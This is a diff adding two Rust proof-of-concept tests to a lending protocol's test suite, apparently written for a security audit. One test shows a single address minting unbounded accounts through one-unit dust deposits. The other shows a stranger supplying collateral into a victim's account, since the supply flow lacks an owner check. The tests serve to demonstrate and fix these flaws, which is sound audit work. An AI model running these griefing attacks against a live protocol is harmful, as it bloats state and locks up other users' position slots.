@@ -416,3 +416,90 @@ fn test_bulk_supply_duplicate_asset_counts_once() {
     t.ctrl_client().supply(&alice, &account_id, &0u32, &assets);
     t.assert_supply_near(ALICE, "USDC", 75_000.0, 1.0);
 }
+
+// POC (VECTOR.md #5.1): permissionless account-creation spam. `supply` enforces
+// only `require_positive_amount` (> 0) and `can_supply`/position-limit checks —
+// there is NO minimum-deposit / dust-value floor (`validate_deposit`,
+// supply.rs:123). Each `supply(account_id = 0)` mints a fresh controller account
+// (`create_account` → monotonic `AccountNonce`), writing AccountMeta +
+// SupplyPositions persistent entries. A single external address can therefore
+// create unbounded accounts with 1-raw-unit deposits, bloating controller state
+// and threatening the keeper's bounded account scan (legit accounts beyond the
+// scan window miss TTL bumps → risk of archival).
+#[test]
+fn poc_single_actor_spams_unbounded_dust_accounts() {
+    let mut t = LendingTest::new().with_market(usdc_preset()).build();
+
+    let attacker = t.get_or_create_user("attacker");
+    let usdc = t.resolve_market("USDC");
+    // Fund the attacker with just enough for N one-unit deposits.
+    const N: u64 = 64;
+    usdc.token_admin.mint(&attacker, &(N as i128));
+    let asset = usdc.asset.clone();
+
+    let ctrl = t.ctrl_client();
+    let mut created: u64 = 0;
+    let mut last_id: u64 = 0;
+    for _ in 0..N {
+        // account_id = 0 forces a brand-new account every call.
+        let dust = vec![&t.env, (asset.clone(), 1i128)];
+        let id = ctrl.supply(&attacker, &0u64, &0u32, &dust);
+        assert!(id > 0, "1-unit deposit must be accepted (no dust floor)");
+        // Strictly increasing => each call minted a fresh, distinct account.
+        assert!(id > last_id, "each supply(id=0) must mint a new account id");
+        assert!(ctrl.account_exists(&id), "spammed account persists in storage");
+        last_id = id;
+        created += 1;
+    }
+
+    // One address created N distinct, persistent accounts from 1-unit deposits.
+    assert_eq!(
+        created, N,
+        "one actor created {N} distinct accounts with dust deposits"
+    );
+}
+
+// POC (VECTOR.md #12.1): `process_supply` is the ONLY position flow without
+// `require_account_owner_match` (borrow/withdraw/multiply/swap_*/migrate all
+// have it). A non-owner can therefore supply collateral into a *victim's*
+// existing account, consuming the victim's bounded supply-position slots
+// (gifting funds + a slot-exhaustion griefing surface). This proves the missing
+// owner check: BOB supplies ETH into ALICE's account; the position lands on
+// ALICE's account (owner unchanged) with no owner-match revert.
+#[test]
+fn poc_non_owner_can_supply_into_victims_account() {
+    let mut t = LendingTest::new()
+        .with_market(usdc_preset())
+        .with_market(eth_preset())
+        .build();
+
+    // ALICE opens her account with a USDC supply.
+    let alice = t.get_or_create_user(ALICE);
+    let usdc = t.resolve_market("USDC").asset.clone();
+    t.resolve_market("USDC").token_admin.mint(&alice, &100_000_000);
+    let alice_id = t
+        .ctrl_client()
+        .supply(&alice, &0u64, &0u32, &vec![&t.env, (usdc, 100_000_000i128)]);
+    assert!(alice_id > 0);
+
+    // BOB — a stranger, not the owner — supplies ETH straight into ALICE's account.
+    let bob = t.get_or_create_user(BOB);
+    let eth = t.resolve_market("ETH").asset.clone();
+    t.resolve_market("ETH").token_admin.mint(&bob, &50_000_000);
+    let returned = t
+        .ctrl_client()
+        .supply(&bob, &alice_id, &0u32, &vec![&t.env, (eth, 50_000_000i128)]);
+
+    // No owner-match revert: the deposit lands on ALICE's account, BOB consumed
+    // one of her supply-position slots, and ALICE still owns the account.
+    assert_eq!(returned, alice_id, "stranger's supply targets the victim account");
+    assert!(
+        t.supply_balance_for(ALICE, alice_id, "ETH") > 0.0,
+        "stranger-gifted ETH position now occupies a slot on the victim account"
+    );
+    assert_eq!(
+        t.get_account_owner(alice_id),
+        alice,
+        "owner is unchanged — BOB gifted collateral he cannot withdraw"
+    );
+}
